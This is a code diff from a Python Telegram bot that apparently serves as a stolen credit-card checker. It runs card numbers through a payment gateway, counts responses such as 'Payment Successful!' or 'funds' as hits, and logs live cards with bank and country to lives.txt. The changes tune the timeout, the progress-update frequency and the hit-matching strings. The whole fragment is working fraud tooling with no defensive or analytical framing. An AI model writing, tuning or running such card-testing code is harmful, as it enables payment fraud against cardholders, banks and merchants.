@@ -119,7 +119,7 @@ def run_checker(message):
                 # ===== CHECKER WITH TIMEOUT =====
                 try:
                     # 25 seconds timeout
-                    last = str(func_timeout(70, Tele, args=(cc,)))
+                    last = str(func_timeout(100, Tele, args=(cc,)))
                 except FunctionTimedOut:
                     last = 'Gateway Time Out ❌'
                 except Exception as e:
@@ -150,9 +150,9 @@ def run_checker(message):
                 markup = types.InlineKeyboardMarkup(row_width=1)
                 markup.add(types.InlineKeyboardButton("⛔ sᴛᴏᴘ ⚠️", callback_data="stop"))
                 
-                is_hit = 'Payment Successful' in last or 'funds' in last or 'security code' in last
+                is_hit = 'Payment Successful!' in last or 'funds' in last or 'security code' in last
                 
-                if is_hit or (dd % 10 == 0):
+                if is_hit or (dd % 15 == 0):
                     try:
                         bot.edit_message_text(chat_id=chat_id, message_id=ko, text=view_text, reply_markup=markup)
                     except Exception as e:
@@ -162,11 +162,11 @@ def run_checker(message):
                 print(f"{chat_id} : {cc} -> {last}")
                 
                 # 🔥 SAVE TO FILE LOGIC 🔥
-                if 'Payment Successful' in last or 'funds' in last:
+                if 'Payment Successful!' in last or 'funds' in last:
                     with open("lives.txt", "a") as f:
                         f.write(f"{cc} - {last} - {bank} ({country})\n")
 
-                if 'Payment Successful' in last:
+                if 'Payment Successful!' in last:
                     ch += 1
                     msg = f''' 
 𝐂𝐀𝐑𝐃: <code>{cc}</code>
